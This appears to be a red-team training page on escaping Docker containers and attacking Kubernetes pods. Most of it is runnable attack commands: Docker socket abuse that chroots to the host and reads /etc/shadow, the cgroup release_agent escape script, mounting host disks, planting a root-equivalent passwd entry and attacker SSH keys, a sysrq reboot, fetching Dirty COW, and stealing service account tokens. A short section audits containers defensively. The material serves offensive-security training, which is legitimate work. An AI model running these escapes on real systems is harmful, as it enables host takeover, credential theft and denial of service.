---
layout: training-page
title: "Docker Security & Escape — Red Team Academy"
module: "Red Team Tools"
tags:
  - docker
  - container-escape
  - privilege-escalation
  - docker-socket
  - privileged-container
page_key: "tools-docker-security"
render_with_liquid: false
---

# Docker Security & Escape

Docker containers share the host kernel. Misconfigurations — exposed Docker socket, privileged containers, excessive capabilities, writable host mounts — allow escaping the container and gaining root on the host. This page covers common container attack vectors and escape techniques from an attacker's perspective.

## Container Reconnaissance

```
# Determine if you're inside a container:
cat /proc/1/cgroup | head -5
# Docker: contains "docker" or long hex ID
# K8s: contains "kubepods"

ls -la /.dockerenv 2>/dev/null  # Docker-specific file

# Also check:
hostname  # often a short container ID in Docker
env | grep -iE "(KUBERNETES|DOCKER|CONTAINER|POD)"

# Check current capabilities:
capsh --print
cat /proc/self/status | grep CapEff
# Decode: capsh --decode=00000000a80425fb

# Check if running privileged:
cat /proc/self/status | grep CapEff
# 0000003fffffffff = all capabilities = privileged container

# Check mounted filesystems:
cat /proc/mounts | grep -v "^cgroup\|^proc\|^sys\|^tmpfs\|^devpts\|^mqueue\|^shm"

# Check for sensitive mounts:
mount | grep -iE "(sock|docker|host|/var|/etc|/root)"
```

## Docker Socket Escape

If /var/run/docker.sock is mounted inside the container, the attacker has unrestricted root access to the host.

```
# Check for Docker socket:
ls -la /var/run/docker.sock
# If accessible: full host compromise

# Method 1: Start a privileged container with host filesystem mounted:
docker -H unix:///var/run/docker.sock run \
  -v /:/host \
  --rm -it alpine chroot /host sh

# Method 2: Use curl to interact with Docker API directly:
curl --unix-socket /var/run/docker.sock \
  http://localhost/containers/json

# Create container with host mount via API:
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -X POST http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host sh -c \"id; cat /etc/shadow\""],"Binds":["/:/host:rw"]}'

# Method 3: Docker installed inside container:
docker run -v /:/host --privileged --rm -it alpine chroot /host sh

# All three methods give root shell on host
# After chroot /host: read /etc/shadow, add SSH key, install backdoor
```

## Privileged Container Escape

A container running with --privileged has all Linux capabilities and can access host devices.

```
# Verify privileged:
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Method 1: Mount host filesystem via /dev:
# List block devices visible from privileged container:
fdisk -l

# Mount host root partition:
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs  # adjust device name
ls /tmp/hostfs/etc/shadow

# Write SSH key to host:
cat ~/.ssh/id_rsa.pub >> /tmp/hostfs/root/.ssh/authorized_keys

# Method 2: Release group capability (cgroups notify_on_release trick):
# Host kernel CVE path — write cgroup notify_on_release
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output  # Should show root uid on host
```

## Capability Abuse

Specific Linux capabilities granted to containers can enable host compromise even without full privilege.

```
# CAP_NET_ADMIN — network packet manipulation, interface config:
# Can perform ARP spoofing, MITM attacks on host network

# CAP_SYS_ADMIN — broadest single capability:
# Mount filesystems:
mount -t proc proc /proc/mnt
# Access host namespaces

# CAP_SYS_PTRACE — can attach to processes:
# Attach to host process and read/write memory:
gdb -p HOST_PID
# Or: inject shellcode into running process

# CAP_DAC_READ_SEARCH — bypass file permission checks:
# Read any file on host (if filesystem shared):
# Use openat() to traverse host symlinks

# CAP_CHOWN / CAP_DAC_OVERRIDE — change file ownership:
# Change ownership of /etc/shadow, /etc/sudoers

# Enumerate capabilities inside container:
capsh --print | grep "Current:"
# Look for any capability beyond baseline set
```

## Host Volume Mount Attacks

```
# Sensitive host paths mounted into container:
mount | grep -iE "(/etc|/root|/home|/var/lib|/proc/sysrq)"

# If /etc mounted: modify /etc/passwd, /etc/sudoers, /etc/shadow
echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "" >> /etc/passwd  # or add root-equivalent user

# If /root/.ssh mounted: add attacker's SSH key
cat attacker.pub >> /root/.ssh/authorized_keys

# If /proc/sysrq-trigger mounted: crash host (DoS), reboot, etc.
echo b > /proc/sysrq-trigger  # reboot host

# If Docker socket mounted via volume:
ls /run/docker.sock /var/run/docker.sock
# See Docker socket escape section above
```

## Container Scanning and Misconfig Detection

```
# From the host — audit running containers:

# Check for containers running with --privileged:
docker inspect $(docker ps -q) | grep -A5 '"Privileged"'
docker inspect CONTAINER_ID | grep -i privileged

# Check for dangerous volume mounts:
docker inspect $(docker ps -q) | grep -A10 '"Binds"'
docker inspect CONTAINER_ID | jq '.[].HostConfig.Binds'

# Check port exposure:
docker ps --format "{{.Ports}}"
docker inspect CONTAINER_ID | jq '.[].HostConfig.PortBindings'

# Docker Bench for Security (audit from host):
docker run --net host --pid host --userns host --cap-add audit_control \
  -v /etc:/etc:ro -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security docker/docker-bench-security

# Trivy — container image vulnerability scanning:
trivy image target-image:latest
trivy image --severity HIGH,CRITICAL alpine:3.18

# grype — vulnerability scanner:
grype nginx:latest
```

## Escaping via Kernel Exploits

```
# Containers share the host kernel — kernel exploits affect all containers
# Check kernel version:
uname -r

# Dirty COW (CVE-2016-5195) — works inside containers:
# Affects: Linux kernel < 4.8.3
# From inside container → root on host
git clone https://github.com/dirtycow/dirtycow.github.io
# Compile and run within container

# runc vulnerability (Leaky Vessels CVE-2024-21626):
# Container escape via /proc/self/fd in working directory

# Relevant CVEs for container escape:
# CVE-2019-5736 — runc container escape
# CVE-2021-22555 — Linux kernel heap overflow
# CVE-2022-0847 (Dirty Pipe) — kernel < 5.16.11
searchsploit container escape
searchsploit docker escape
```

## Kubernetes Context

```
# In K8s — check security context of the pod:
# From outside: kubectl get pod POD_NAME -o yaml | grep -A20 securityContext

# From inside pod — check capabilities:
cat /proc/self/status | grep Cap

# Check for service account tokens (default mounted):
ls /run/secrets/kubernetes.io/serviceaccount/
cat /run/secrets/kubernetes.io/serviceaccount/token

# Use service account token to interact with API server:
APISERVER="https://kubernetes.default.svc"
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
CACERT="/run/secrets/kubernetes.io/serviceaccount/ca.crt"

curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/pods"

# See /tools/kubernetes-security/ for full K8s attack coverage
```

## Tools

- deepce — `github.com/stealthcopter/deepce` — Docker/container privilege escalation
- amicontained — `github.com/genuinetools/amicontained` — introspect container capabilities
- Trivy — `github.com/aquasecurity/trivy` — container image scanning
- Docker Bench for Security — `github.com/docker/docker-bench-security`
- grype — `github.com/anchore/grype` — vulnerability scanner for containers
- ThreatMapper — `github.com/deepfence/ThreatMapper`

## Resources

- OWASP Docker Security Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html`
- OWASP Docker Top 10 — `github.com/OWASP/Docker-Security`
- HackTricks Docker Security — `book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security`
- Leaky Vessels CVE-2024-21626 — `snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout`
